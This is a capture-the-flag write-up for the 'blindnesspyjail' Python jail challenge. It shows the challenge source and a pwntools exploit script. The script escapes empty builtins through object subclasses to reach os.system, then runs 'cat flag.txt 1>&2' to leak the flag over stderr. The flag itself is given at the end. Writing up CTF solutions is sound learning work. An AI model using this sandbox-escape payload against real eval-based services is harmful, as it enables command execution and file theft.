# blindnesspyjail

```
what flag? can't see it.

nc challs1.pyjail.club 19992
```

Attachment:

```python
#!/usr/local/bin/python3
import sys
inp = input('blindness > ')
sys.stdout.close()
flag = open('flag.txt').read()
eval(inp, {'__builtins__': {}, 'flag': flag})
print('bye bye')
```

Although stdout is banned, we can print flag to stderr. To handle empty builtins, we can use the traditional `().__class__.__base__.__subclasses__()` trick to find `os`:

```python
from pwn import *

context(log_level="debug")

subclasses = str(().__class__.__base__.__subclasses__())

# find the indices of the builtins
# os._wrap_close is at 159 in docker
os_index = 159
# assert subclasses.split(", ").index("<class 'os._wrap_close'>") == os_index

# p = process(["python3", "main.py"])
p = remote("challs1.pyjail.club", 19992)
p.sendline(
    f"().__class__.__base__.__subclasses__()[{os_index}].__init__.__globals__['system']('cat flag.txt 1>&2')"
)
p.interactive()
```

Flag: `jail{stderr_leak_5fd787f079eb69e}`.

An elegant and simple solution is provided by @mirelgigel at [mirelgigel/writeupjailctf](https://github.com/mirelgigel/writeupjailctf).
